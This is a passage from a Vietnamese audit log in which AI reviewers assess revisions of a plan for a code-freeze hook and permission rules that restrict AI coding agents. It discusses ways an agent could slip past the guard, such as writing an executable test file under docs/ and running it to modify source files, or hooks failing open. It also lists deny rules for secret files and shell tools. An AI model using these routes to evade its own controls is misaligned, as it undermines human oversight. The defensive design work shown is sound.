| S2 Lifecycle & Teardown            |   PASS   | Không có SSE/connection. Các hàm mới là hàm thuần, inject `options.planApproved` và `maxDatePrefix`. `[SRC]` `extractInput` (`:634-696`) đã đọc `tool_input.file_path`/`content`/`command` của Claude CLI; `[CMD]` probe `extractInput({ tool_name: "Write", tool_input: { file_path, content } })` → trích xuất đúng. |
| S3 Database & Temporal             |   PASS   | Không chạm DB. Logic ngày (Mục 6.1) không đổi so với Run 5, nơi `[CMD]` đã chứng minh 5 kịch bản.                                                                                                                                                                                                                      |
| S4 Cross-Task State                |   PASS   | `[CMD]` header và dòng không rỗng cuối của 4 plan `2026-10-19`: pstack/swap/vitest đều `Approved` + `[PLAN_APPROVED]`, governance `Ready for Review` (trước lượt này). `ls docs/plans`: không có plan nào ngày ≥ `2026-10-20`.                                                                                         |
| S5 Security Boundary               | **FAIL** | `BLK-04` (`docs/**` + hook `allow` nới quyền), `MAJ-10` (schema output của hook). `.env*`: PASS nhờ deny rule (`[URL]` §Precedence).                                                                                                                                                                                   |
| S6 External Resilience             |   PASS   | `[SRC]` `run-claude.ps1:164-179` giữ phát hiện quota → `exit 42`.                                                                                                                                                                                                                                                      |
| Domain (Governance / Model Roster) |   PASS   | Không đổi so với Run 5.                                                                                                                                                                                                                                                                                                |

#### 5. Adversarial Timelines (4 trục)

1. **Đồng thời**: T1 Planner tạo plan mới `2026-10-23` (`Ready for Review`) | T2 agent khác ghi vào `src/` | T3 nhóm ngày mới nhất có plan pending → `false`. **AN TOÀN**.
2. **TOCTOU**: T1 hook kiểm tra `Write docs/notes/x.test.mjs` (chỉ là file docs) | T2 file được dùng như mã thực thi qua `npx vitest run` | T3 ghi vào `src/**`. **LỖI** (`[BLOCKER]` `BLK-04`).
3. **Thất bại giữa chừng / chính bước dọn dẹp**: T1 hook `node …/code-freeze-guard.js` crash hoặc in JSON sai schema | T2 Claude Code coi đây là lỗi không chặn | T3 lệnh chạy tiếp mà không qua Lớp 1. **LỖI** (`[MAJOR]` `MAJ-10`).
4. **Môi trường / kênh thực thi**: dưới `dontAsk`, hook `allow` bỏ qua bước auto-deny, nên quyền thực tế là hợp của `--allowedTools` và các nhánh `allow` của `decide()` (không phải giao của hai bên). **LỖI** (`[BLOCKER]` `BLK-04`).

#### 6. Commands Executed

- `wc -c`/`wc -l`/`wc -m` trên rules, agents, plan và scripts; `grep -n '^#'` trên plan; `git diff --stat`.
- `ls docs/plans`; `sed -n '3,5p'` và dòng không rỗng cuối của 4 file `docs/plans/2026-10-19-*.md`.
- `sed -n` trên `.agents/scripts/code-freeze-guard.js` (dòng 20–110, 400–480, 625–725) và `grep isAntigravityArtifact`; `cat vitest.config.ts`.
- `node -e` (Nhóm C, in-memory; import module và gọi `decide()`/`extractInput()` thuần, không ghi file, không mạng): 5 case `decide()` và 1 case `extractInput()` (kết quả ở `BLK-04`/`MIN-06`/S2); probe regex `MUTATING_FLAGS`/`READ_ONLY_COMMANDS` của plan (8 case).
- `npm run type-check` → exit 0.
- `npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot` → `92 passed (92)`.
- WebFetch `https://code.claude.com/docs/en/hooks` và `https://code.claude.com/docs/en/permissions` (dòng 82, 627, 631, 653 của bản lưu).

#### 7. Dismissed Findings

- **Nghi vấn hook `allow` vượt qua `Read(.env*)` hoặc `Edit(src/**)`**: Loại bỏ. `[URL]`§Precedence: "a matching deny rule blocks the call … even when the hook returned`allow`". Lỗi chỉ xảy ra với các lệnh **không** bị deny (`BLK-04`).
- **Nghi vấn `extractInput` không đọc payload của Claude CLI**: Loại bỏ. `[SRC]` `:636-645,670-675` đã đọc `tool_input`, `tool_name`, `file_path`, `content`, `command`.
- **Nghi vấn `-c\b` trong `MUTATING_FLAGS` chặn nhầm lệnh hợp lệ**: Loại bỏ. `[CMD]` probe cho thấy `npm run type-check`, `verify-docs.mjs --strict-shorthand --expected-headings=113`, `git log -n 5 --oneline` đều không khớp.
- **Nghi vấn `npx vitest run -r <dir>` lọt qua**: Loại bỏ ở kênh hook. `[CMD]` regex vitest của plan → `false` (cờ `-r` bị chặn vì bắt đầu bằng `-`).

#### 8. Kết Luận & Việc Cần Làm Cho Planner (Revision 7)

1. `BLK-04`: Ở kênh CLI, ánh xạ guard `allow` → `defer`. Chặn file có đuôi thực thi trong toàn bộ `docs/**` (hoặc exclude `docs/**` trong `vitest.config.ts`). Bổ sung `TC-04(c)`, `TC-05(e)`, Negative Probe, rồi cập nhật Mục 3.1.3, 6.2, 6.3 và Risk #1.
2. `MAJ-10`: Bỏ `...result` khỏi output `PreToolUse`, thêm `"onFailure": "block"`, mở rộng `TC-05(c)` và thêm Wiring Probe chạy hook với payload thật qua stdin.
3. `MIN-06`: Khuyến nghị, không chặn plan (tự hết nếu sửa `BLK-04` theo hướng `defer`).

[CHANGES_REQUESTED]

### Audit Run 7

[REVIEWER_MODEL: claude-code-cli (fallback)]

- **Reviewer**: Claude Code CLI (Fallback Reviewer)
- **Ngày**: 2026-10-23
- **Đối tượng**: Revision 7 (`docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md`)
- **Kết quả**: `[CHANGES_REQUESTED]` (0 `[BLOCKER]`, 2 `[MAJOR]`, 1 `[MINOR]`)

#### 1. Kiểm Chứng Lỗi Cũ (Từ Audit Run 6)

| Mã Lỗi   |   Mức Độ    | Trạng Thái | Bằng Chứng                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| :------- | :---------: | :--------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `BLK-04` | `[BLOCKER]` | **ĐÃ SỬA** | Mục 6.2 dòng 435–443: Gate 3 kiểm tra `.md` cho **toàn bộ** `UNFROZEN_PREFIXES` + `UNFROZEN_FILES` → `docs/notes/x.test.mjs` bị `ask` → `deny` dưới `dontAsk`. `[SRC]` `.agents/scripts/code-freeze-guard.js:39,42`: `UNFROZEN_PREFIXES = ["docs/"]`, `UNFROZEN_FILES` toàn `.md`. `[CMD]` `find docs -type f ! -name '*.md'` → rỗng, nên cổng `.md`-only không chặn nhầm file docs nào đang có. Ở kênh CLI, vector này bị chặn thêm một lần nữa ở tầng permission: `Write docs/notes/*` không có trong `--allowedTools` (`Edit(docs/plans/*.md)`), nên `dontAsk` tự từ chối. Đã có `TC-04(c)`, `TC-05(e)` và Negative Probe 3. |
| `MAJ-10` |  `[MAJOR]`  | **ĐÃ SỬA** | Mục 6.2 dòng 480–498 không còn `...result`. `[CMD]` `node -e` chạy bản sao `formatHookOutput` của plan: `allow` → `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"defer"}}`; `ask` → `permissionDecision:"deny"` + `permissionDecisionReason`; cả hai đều không có `decision` cấp gốc. `$claudeHookSettings` (dòng 591) có `"onFailure":"block"`. `[URL]` `https://code.claude.com/docs/en/hooks.md` §Command hook fields xác nhận `onFailure: "continue" \| "block"`. Đã có Wiring Probe chạy payload qua stdin (Mục 9.3.1).                                                                        |
| `MIN-06` |  `[MINOR]`  | **ĐÃ SỬA** | `$sharedDisallowed` có `Bash(powershell *),Bash(pwsh *),Bash(claude *)`. `[URL]` permissions §Precedence: "Claude Code evaluates deny and ask rules regardless of what a PreToolUse hook returns" → chặn được bất kể hook trả gì.                                                                                                                                                                                                                                                                                                                                                                                               |

#### 2. Phát Hiện Mới

##### `[MAJOR]` `MAJ-11`: Plan mới `docs/plans/2026-10-23-strata-local-llm-implementation-plan.md` làm sai giả định Mục 3.2. Repo sẽ bị **khóa lại giữa chừng ngay khi Bước 4 triển khai `evaluateLatestDateGroupPlans`**, và `MAJ-06` đang được giải quyết dựa trên nhóm ngày sai

- **Vị trí**: Mục 1.1 (dòng 58, 65), Mục 3.2 (dòng 143–151), Bước 4–5, Wiring Probe 3, Risk #4.
- **Bằng chứng**:
  - `[CMD]` `git status --short` → `?? docs/plans/2026-10-23-strata-local-llm-implementation-plan.md`. `[CMD]` `sed -n 1,12p` trên file đó → `- **Status**: Ready for Review`, `- **Date**: 2026-10-23`.
  - `[CMD]` `node -e` (Nhóm C, chỉ đọc `docs/plans/*.md` vào bộ nhớ, không ghi file) chạy lại đúng thuật toán Mục 6.1 trên các file plan thật:
    - Hiện trạng → `{"L":"2026-10-23","g":["2026-10-23-strata-…"],"res":false}`.
    - **Giả lập plan này đã `Approved` + `[PLAN_APPROVED]`** → vẫn `{"L":"2026-10-23",…,"res":false}`.
    - Bỏ file strata ra → `{"L":"2026-10-19",…,"res":true}`.
  - `[SRC]` `.agents/scripts/code-freeze-guard.js:193-201`: code **hiện tại** chọn plan theo `mtimeMs` mới nhất. Vì plan này vừa được sửa sau cùng, thẻ phê duyệt sẽ mở khóa repo ở code cũ. Nhưng ngay khi Bước 4 thay `isPlanApproved()` bằng logic nhóm ngày, nhóm mới nhất sẽ là `2026-10-23`, chỉ có plan strata đang chờ duyệt. Khi đó `isPlanApproved()` trả về `false`.
- **Timeline [ADV]** (trục đồng thời / cross-task):
  - T1: Plan này được duyệt. Code cũ (mtime) trả `true`, bắt đầu Bước 1–4.
  - T2: Bước 4 ghi `code-freeze-guard.js` mới, với `evaluateLatestDateGroupPlans` và nhóm mới nhất `2026-10-23` (strata `Ready for Review`).
  - T3: Bước 5 sửa `.gitignore` và `scripts/verify-docs.mjs` (đều không thuộc `docs/`) → `decide()` trả `ask` vì `planApproved=false`. Kênh Antigravity thì hỏi User, còn kênh CLI (`dontAsk`) thì `deny`.
  - **Kết cục**: chuỗi triển khai bị gãy giữa chừng. Mục 3.2 ("nhóm mới nhất là `2026-10-19`") và Wiring Probe 3 ("đóng 4 plan `2026-10-19` → `false`") đúng kết quả nhưng sai lý do. Ngoài ra, khi plan strata được `Approved`, nó sẽ là plan duy nhất quyết định khóa/mở toàn repo, kể cả nếu plan này chưa đóng `Completed`. → **LỖI (`[MAJOR]`, Gate hạng mục 5 sai)**.
  - Thêm một điểm lệch: Header plan này ghi `Date: 2026-10-23` nhưng tên file mang tiền tố `2026-10-19`. Thiết kế "tiền tố tên file là nguồn chân lý" khiến plan này luôn thua mọi plan mới hơn, nhưng Plan không nêu ra điều này.
- **Yêu cầu**:
  1. Cập nhật Mục 3.2: liệt kê `2026-10-23-strata-local-llm-implementation-plan.md` và trạng thái của nó, rồi chọn rõ một chiến lược. Ví dụ: (a) đổi thứ tự Bước 4 để thay guard **sau cùng**, sau mọi bước ghi ngoài `docs/`; (b) ghi rõ điều kiện tiên quyết là plan strata phải `Approved`/`Completed` hoặc chưa tồn tại trong `docs/plans/` khi triển khai; hoặc (c) đổi tên file plan này sang tiền tố `2026-10-23`. Lưu ý (c) vẫn bị fail-safe chặn khi strata `Ready for Review` cùng ngày.
  2. Sửa Mục 1.1, Bước 5, Wiring Probe 3 và Risk #4 để không còn khẳng định cứng "nhóm `2026-10-19` là mới nhất". Thêm `TC-02(g)`: nhóm ngày mới hơn có plan `Ready for Review` → `false` kể cả khi plan cũ hơn `Approved`. Đây là hành vi mong muốn, nhưng Plan phải tính nó vào thứ tự triển khai.

##### `[MAJOR]` `MAJ-12`: Lớp 1 dựa vào hành vi runtime của `permissionDecision: "defer"` trong `claude -p` mà chưa được chứng minh. Tài liệu đọc được mâu thuẫn nhau, và có một cách đọc khiến **cả 2 kênh CLI (Primary Planner + Fallback Reviewer) chết ngay ở tool call đầu tiên**

- **Vị trí**: Mục 1.1 dòng 42, Mục 3.1.3 Lớp 1, Mục 6.2 dòng 483–488, Mục 6.3, Risk #1, `TC-05(e)`, Wiring Probe 1.
- **Bằng chứng** (`[URL]`, 4 lần WebFetch `https://code.claude.com/docs/en/hooks` / `hooks.md` trong lượt này):
  - §PreToolUse decision control: `"defer"` "applies the session's permission mode" (khớp với giả định của plan).
  - Một lần fetch khác: "In `-p` mode, "defer" and the normal permission flow both result in an automatic allow".
  - Một lần fetch khác: "In non-interactive `-p` mode … blocks the tool call and exits the process with status code 2".
  - Hành vi duy nhất xuất hiện **nhất quán** qua các lần fetch: "Exit code 0 with no output means the hook has no decision to report, so the tool call continues through the normal permission flow."
  - Ngoài ra, §Workspace trust: "In a `-p` session, hooks in folder settings don't run even after you trust the folder". Plan chưa chứng minh hook nạp qua `--settings` có thực sự chạy trong `-p`.
- **Phân tích**: Theo `evidence-bar.md` §4.5.1, mô tả hành vi thư viện của Planner chưa được coi là đã xác minh, và `[URL]` không đủ cho hành vi runtime tinh vi. Lớp bảo mật **không** phụ thuộc vào `defer`: deny rules + `dontAsk` + Gate 3 đã chặn đủ, và nhánh `ask` → `deny` không mơ hồ. Nhưng nếu cách đọc "exit 2" là đúng, mọi `Read`/`Bash` hợp lệ đều làm `run-claude.ps1` thoát với mã `2`, không phải `40/41/42`. Orchestrator sẽ không tự fallback sang `@planner`, và chuỗi Uninterrupted Execution Chain bị gãy (S1/S6). `TC-05(e)` và Wiring Probe 1 chỉ kiểm tra JSON trên stdout, không kiểm tra hành vi end-to-end của `claude -p`.
- **Timeline [ADV]** (trục thất bại giữa chừng):
  - T1: `run-claude.ps1 -Role reviewer` khởi chạy `claude -p --permission-mode dontAsk --settings …`.
  - T2: Reviewer gọi `Read docs/plans/x.md` → `decide()` `allow` → hook in `permissionDecision:"defer"`.
  - T3: Nếu `-p` xử lý `defer` bằng cách thoát mã 2 → phiên kết thúc trước khi viết Audit Run, và `$claudeExitCode = 2` không khớp nhánh fallback nào.
  - **Kết cục**: chưa xác định được (UNVERIFIED). Rủi ro mất kênh là nghiêm trọng, trong khi chi phí sửa gần như bằng 0.
- **Yêu cầu**:
  1. Khi `hook_event_name === "PreToolUse"` và `result.decision === "allow"`: **không in gì ra stdout và exit 0**. Đây là hành vi "no decision → normal permission flow" được tài liệu mô tả nhất quán, và nó giữ nguyên ý đồ "chỉ thắt chặt" của `BLK-04`. Sửa `formatHookOutput` (ví dụ trả về `null` → `main()` không ghi gì), cùng `TC-05(e)`, Mục 3.1.3 và Risk #1.
  2. Thêm vào Mục 9.3 một **End-to-End Smoke Probe do User tự chạy** (vì `claude -p` nằm ngoài allowlist của Reviewer). Gọi `run-claude.ps1` với một task thử, yêu cầu: (a) `Read` một file thường thì thành công và tiến trình **không** thoát mã 2; (b) `Read .env.local` bị từ chối; (c) `Write docs/notes/x.test.mjs` bị từ chối; (d) chạy với `--debug` và xác nhận log có dòng hook `code-freeze-guard.js` (chứng minh hook từ `--settings` có chạy trong `-p`). Ghi kết quả vào `docs/plans/README.md` hoặc phần Verification.

##### `[MINOR]` `MIN-07`: `-c\b` / `-u\b` trong `MUTATING_FLAGS` chặn nhầm (fail-closed) các đường dẫn có gạch nối, và hook dùng đường dẫn tương đối

- `[CMD]` regex `MUTATING_FLAGS` của plan khớp `npx vitest run src/lib/features/chat/batch-c.test.ts` → `true` (chặn nhầm). Không gây rủi ro bảo mật. Có thể neo cờ bằng `(?:^|\s)-c(?:\s|=|$)`.
- `$claudeHookSettings` dùng `node .agents/scripts/code-freeze-guard.js` (tương đối theo cwd). `[URL]` hooks §Reference scripts by path khuyến nghị `${CLAUDE_PROJECT_DIR}`. Hiện đã fail-closed nhờ `onFailure: "block"`, nên đây chỉ là khuyến nghị.

#### 3. Plan Completeness Gate (7 Hạng Mục)

|  #  | Hạng mục                                |      Kết quả       | Ghi chú                                                                                                              |
| :-: | :-------------------------------------- | :----------------: | :------------------------------------------------------------------------------------------------------------------- |
|  1  | Bảng Verified Versions 2026             |        PASS        | Mục 4; `package.json` không đổi.                                                                                     |
|  2  | Checklist `[NEW]`/`[MODIFY]`/`[DELETE]` |        PASS        | 2/3/29.                                                                                                              |
|  3  | Verification Plan & Probes              |      **FAIL**      | Thiếu E2E Smoke Probe cho Lớp 1 trong `claude -p` (`MAJ-12`).                                                        |
|  4  | Test Contract                           | PASS (cần bổ sung) | `TC-02(g)` (`MAJ-11`); sửa `TC-05(e)` theo hướng no-output (`MAJ-12`).                                               |
|  5  | Assumptions & Cross-Task Dependencies   |      **FAIL**      | Mục 3.2 bỏ sót plan `2026-10-23-strata-…` (`MAJ-11`). Giả định 3.1.3 Lớp 1 về `defer` chưa được xác minh (`MAJ-12`). |
|  6  | Out of Scope                            |        PASS        | Mục 1.2.                                                                                                             |
|  7  | Skills Loaded & Applied                 |        PASS        | Mục 2.2 trích dẫn 5 `SKILL.md`; task không chạm domain streaming/DB/UI runtime.                                      |

#### 4. Mental Simulation Matrix (S1–S6 + Domain)

| Kịch bản                           |     Kết quả     | Bằng chứng                                                                                                                                                                                                                                                                                                                                                                      |
| :--------------------------------- | :-------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| S1 Cold-start & Build              | PASS (baseline) | `[CMD]` `npm run type-check` → exit 0. `[CMD]` `npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot` → `92 passed (92)`. Không có dependency mới. Khả năng khởi chạy kênh CLI: xem S6/`MAJ-12`.                                                                                                                                                             |
| S2 Lifecycle & Teardown            |      PASS       | Không có SSE/connection. Các hàm mới là hàm thuần, inject `options`. `main()` fail-closed khi parse lỗi (Mục 6.2 dòng 515–522).                                                                                                                                                                                                                                                 |
| S3 Database & Temporal             |    **FAIL**     | Không chạm DB. Logic ngày đúng về thuật toán, nhưng `[CMD]` mô phỏng trên `docs/plans/` thật cho thấy nhóm ngày mới nhất là `2026-10-23` → khóa repo giữa Bước 4 và Bước 5 (`MAJ-11`).                                                                                                                                                                                          |
| S4 Cross-Task State                |    **FAIL**     | `[CMD]` `git status`, `ls docs/plans` → có plan strata `2026-10-23` (`Ready for Review`) mà Mục 3.2 không nhắc tới (`MAJ-11`).                                                                                                                                                                                                                                                  |
| S5 Security Boundary               |      PASS       | `[URL]` permissions §Precedence: deny rules (`Read(.env*)`, `Edit(src/**)`, `Bash(powershell *)`…) có hiệu lực bất kể hook trả gì. `[URL]` §dontAsk: "Auto-denies every call that would otherwise prompt". Gate 3 `.md`-only (Mục 6.2) cùng nhánh `ask` → `deny` (`[CMD]` probe `formatHookOutput`) đã đóng `BLK-04`. Không có vector ghi `src/**` nào còn mở trên cả hai kênh. |
| S6 External Resilience             |    **FAIL**     | Hành vi `defer` trong `-p` chưa được xác minh, có thể khiến cả hai kênh CLI thoát mã 2 mà không fallback (`MAJ-12`). `[SRC]` `run-claude.ps1:164-179` chỉ map quota/auth sang `40/41/42`.                                                                                                                                                                                       |
| Domain (Governance / Model Roster) |      PASS       | Không đổi so với Run 5–6.                                                                                                                                                                                                                                                                                                                                                       |

#### 5. Adversarial Timelines (4 trục)

1. **Đồng thời / cross-task**: T1 plan này được duyệt (guard cũ theo mtime → `true`) | T2 Bước 4 cài guard nhóm ngày | T3 nhóm `2026-10-23` có strata pending → `false`, Bước 5 bị `ask`/`deny`. **LỖI** (`MAJ-11`).
2. **TOCTOU**: T1 hook kiểm tra `Write docs/notes/x.test.mjs` | T2 Gate 3 `.md`-only → `ask` → `deny` | T3 không có file nào để `vitest` chạy. **AN TOÀN** (`BLK-04` đã đóng).
3. **Thất bại giữa chừng**: T1 hook crash hoặc in JSON sai | T2 `onFailure: "block"` | T3 tool call bị chặn. **AN TOÀN**. Nhánh `defer` thì **UNVERIFIED** (`MAJ-12`).
4. **Môi trường / kênh thực thi**: hook từ `--settings` có thể không chạy trong `-p` (§Workspace trust chưa loại trừ). Dù vậy, `--allowedTools` + deny + `dontAsk` vẫn tự đủ để chặn. **AN TOÀN** về bảo mật, nhưng hiệu lực của Lớp 1 là UNVERIFIED.

#### 6. Commands Executed

- `wc -c` trên plan, rules, agent docs; `grep -n "^#"`, `sed -n` và `Read` các đoạn của plan (dòng 1–843, 1510–1617).
- `sed -n 1,12p` và `tail -n 3` trên `docs/plans/2026-10-23-strata-local-llm-implementation-plan.md`; `ls -la docs/plans`; `git status --short`.
- `sed -n 25,110p`, `160,250p`, `400,520p` trên `.agents/scripts/code-freeze-guard.js`.
- `node -e` (Nhóm C, chỉ đọc `docs/plans/*.md` vào bộ nhớ, không ghi file, không mạng): mô phỏng `evaluateLatestDateGroupPlans` theo 3 kịch bản (kết quả ở `MAJ-11`).
- `node -e` (Nhóm C, thuần): bản sao `formatHookOutput` của plan (3 case) + `MUTATING_FLAGS` (6 case).
- `npm run type-check` → exit 0.
- `npx vitest run .agents/scripts/code-freeze-guard.test.ts --reporter=dot` → `92 passed (92)`.
- `find docs -type f ! -name '*.md'` → rỗng.
- WebFetch: `https://code.claude.com/docs/en/hooks` (2 lần), `https://code.claude.com/docs/en/hooks.md` (3 lần), `https://code.claude.com/docs/en/permissions.md` (1 lần, grep bản lưu: dòng 82, 520–523, 627, 631, 653).

#### 7. Dismissed Findings

- **Nghi vấn cổng `.md`-only chặn nhầm file docs đang có**: Loại bỏ. `[CMD]` `find docs -type f ! -name '*.md'` → rỗng.
- **Nghi vấn hook trả `defer`/`allow` vượt qua `Read(.env*)` hoặc `Bash(claude *)`**: Loại bỏ. `[URL]` permissions dòng 631: "a matching deny rule blocks the call … even when the hook returned `allow`".
- **Nghi vấn `Read` Guard chặn `.env.example`**: Ghi nhận nhưng chấp nhận được. Chặn thừa theo hướng fail-closed, không ảnh hưởng quy trình.
- **Nghi vấn `SAFE_SCRATCH_EXTENSIONS` (`.ts`/`.js` trong brain dir) mở vector thực thi**: Loại bỏ. Brain dir nằm ngoài `REPO_ROOT`, và `--dir`/`--root`/`--config` đã bị chặn ở `MUTATING_FLAGS` + `$sharedDisallowed`.

#### 8. Kết Luận & Việc Cần Làm Cho Planner (Revision 8)

1. `MAJ-11`: Tính plan `2026-10-23-strata-local-llm-implementation-plan.md` vào Mục 3.2 và thứ tự triển khai: đưa bước thay guard xuống cuối, hoặc nêu rõ điều kiện tiên quyết. Thêm `TC-02(g)` và sửa Mục 1.1, Bước 5, Wiring Probe 3, Risk #4.
2. `MAJ-12`: Với `PreToolUse` + `allow`, không in gì ra stdout (exit 0) thay vì `"defer"`. Thêm E2E Smoke Probe do User chạy cho `run-claude.ps1` (gồm `--debug` để xác nhận hook có chạy), và sửa `TC-05(e)`, Mục 3.1.3, Risk #1.
3. `MIN-07`: Khuyến nghị, không chặn plan: neo `-c`/`-u` theo ranh giới khoảng trắng và dùng `${CLAUDE_PROJECT_DIR}` trong lệnh hook.

[CHANGES_REQUESTED]

---

### Audit Run 8

[REVIEWER_MODEL: gemini-4-argon]

- **Reviewer**: Subagent `@reviewer` (`gemini-4-argon`, thinking budget Max)
- **Ngày**: 2026-10-23
- **Đối tượng thẩm định**: Revision 8 (`docs/plans/2026-10-19-remake-agents-governance-v2-implementation-plan.md`)
- **Kết quả**: `[PLAN_APPROVED]` (0 `[BLOCKER]`, 0 `[MAJOR]`, 0 `[MINOR]`)

---

#### 1. Kiểm Chứng Lỗi Cũ (Từ Audit Run 7 & Các Vòng Trước)

| Mã Lỗi                                                         |               Mức Độ                | Trạng Thái | Bằng Chứng Kiểm Chứng Độc Lập Trên Bản Kế Hoạch (Revision 8) & Mã Nguồn (`[SRC]` / `[CMD]`)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| :------------------------------------------------------------- | :---------------------------------: | :--------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- | ------- | ------- | -------- | ------------ | -------- | ------ | ----- | ------------- | ------------ | -------- | -------- | ---------------- | --- | --- | ---- | -------- | --- | ------- | --- | ------------------------- | ----------------------- | --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`MAJ-11`**                                                   |              `[MAJOR]`              | **ĐÃ SỬA** | • **Nhận diện đầy đủ 5 file kế hoạch trong `docs/plans/`**: Đã kiểm chứng `[CMD]` `git status --short` (`?? docs/plans/2026-10-23-strata-local-llm-implementation-plan.md`) và `[SRC]` `docs/plans/2026-10-23-strata-local-llm-implementation-plan.md:1-6` (`- **Status**: Ready for Review`, `- **Date**: 2026-10-23`) cùng 4 file ngày `2026-10-19` (`pstack:4`, `swap:4`, `vitest:4` đều đang `Status: Approved`). Mục 1.1 (dòng 58, 62–63), Mục 2.1 (dòng 103) và Mục 3.2 (dòng 143–156) đã liệt kê đủ cả 5 file thuộc 2 nhóm tiền tố ngày (`2026-10-19` và `2026-10-23`).<br>• **Đảo thứ tự thực thi Bước 4 chạy trước Bước 5**: Tại Mục 7 (dòng 722–740), Bước 4 (cập nhật `.gitignore`, `scripts/verify-docs.mjs`, sửa doc drift và archive `docs/CHANGELOG.md`) được thực thi **trước** khi Bước 5 (dòng 741–771) thay đổi `isPlanApproved()` trong `.agents/scripts/code-freeze-guard.js`. Đối chiếu `[SRC]` `.agents/scripts/code-freeze-guard.js:193-229,443-554`: khi thực thi Bước 4, hàm `isPlanApproved()` hiện hành trên đĩa vẫn sắp xếp theo `mtimeMs` giảm dần và trả về `true` cho bản kế hoạch `2026-10-19-remake-agents-governance-v2-implementation-plan.md` vừa được duyệt, cho phép sửa `.gitignore` và `scripts/verify-docs.mjs` tại Gate 9 (`dòng 541`) mà không bị chặn bởi `2026-10-23-strata-local-llm-implementation-plan.md`. Sang Bước 5, các file cần sửa chỉ thuộc `.agents/**` (Gate 7, dòng 525), `.agents/scripts/code-freeze-guard.test.ts` (Gate 4, dòng 484) và `docs/plans/*.md` (Gate 3, dòng 464), không có file nào phụ thuộc vào Gate 9 (`planApproved`).<br>• **Bổ sung `TC-02(g)`, `Wiring Probe 3`, `Negative Probe 1(f)` & `Risk #4`**: Đã bổ sung kịch bản kiểm thử nhóm ngày mới hơn `2026-10-23` (`Ready for Review`, `mtimeMs` thấp hơn) kết hợp nhóm ngày cũ hơn `2026-10-19` (`Approved`, `mtimeMs` cao hơn) trả về `false` tại `TC-02(g)` (dòng 781) và `Negative Probe 1(f)` (dòng 838); đồng thời đóng `Status: Completed` cho cả 4 kế hoạch ngày `2026-10-19` ở cuối Bước 5 (dòng 766–771, 829–831, 859). |
| **`MAJ-12`**                                                   |              `[MAJOR]`              | **ĐÃ SỬA** | • **Trả về `null` (exit `0`, không ghi stdout) khi `hook_event_name === "PreToolUse"` và `result.decision === "allow"`**: Tại Mục 1.1 (dòng 40–42), Mục 3.1.3 Lớp 1 (dòng 132), Mục 6.2 (dòng 470–537), Mục 6.3 (dòng 543) và Bước 5 (dòng 755, 761), hàm `formatHookOutput(result, rawPayload)` trả về `null` khi `root.hook_event_name === "PreToolUse"` và `result.decision === "allow"`, và `main()` chỉ gọi `process.stdout.write(JSON.stringify(output))` khi `output !== null` (dòng 533–535). Cách thiết kế này loại bỏ việc xuất `permissionDecision: "defer"` (tránh nguy cơ thoát mã `2` trong `claude -p`), không xuất `permissionDecision: "allow"` (không bỏ qua `--allowedTools` và `dontAsk`), và giữ nguyên hành vi xuất JSON `{ decision, reason }` cho kênh Google Antigravity.<br>• **Cập nhật `TC-05(e)`, `Wiring Probe 1`, `Negative Probe 3` & `Risk #1`**: Đã cập nhật tại dòng 784, 816, 842, 856 để kiểm chứng `formatHookOutput` trả về `null` (stdout rỗng `""`, exit code `0`) với payload được phép và trả về `{ hookSpecificOutput }` (không có trường `decision` cấp gốc) với payload bị chặn.<br>• **Bổ sung End-to-End CLI Smoke Probe (`Wiring Probe 4`)**: Đã bổ sung tại Mục 9.3.4 (dòng 832–836) và Bước 5 (dòng 765) kiểm thử thực nghiệm với `claude -p` (`--debug`) cho 3 trường hợp: (1) xác nhận hook từ `--settings` được kích hoạt trong `-p`, (2) `Read docs/plans/README.md` thành công với exit code `0`, (3) `Read .env.local` và `Write docs/notes/x.test.mjs` bị từ chối.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **`MIN-07`**                                                   |              `[MINOR]`              | **ĐÃ SỬA** | • **Neo ranh giới khoảng trắng cho các cờ ngắn `-c`, `-u`, `-i` trong `MUTATING_FLAGS`**: Tại Mục 1.1 (dòng 49), Mục 3.1.3 Lớp 4 (dòng 135), Mục 6.2 (dòng 411–412), Bước 5 (dòng 754), `TC-06` (dòng 785), `TC-08` (dòng 787) và `Negative Probe 4` (dòng 846), `MUTATING_FLAGS` đã được cập nhật thành `/(?:^                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | \s)(?:--fix | --write | --force | --output | --outputFile | --config | --root | --dir | --globalSetup | --setupFiles | --extcmd | --update | --coverage)(?:\s | =   | $)  | (?:^ | \s)-(?:c | u   | i)(?:\s | =   | $)/`. Nhờ điều kiện `(?:^ | \s)`phía trước và`(?:\s | =   | $)`phía sau, đường dẫn test có dấu gạch nối như`npx vitest run src/lib/features/chat/batch-c.test.ts` không còn bị chặn nhầm (`allow`), trong khi `npx vitest run -c docs/plans/x.mjs`, `npx eslint --print-config src/a.ts -c docs/plans/x.mjs`và`npx vitest run -u` vẫn bị chặn 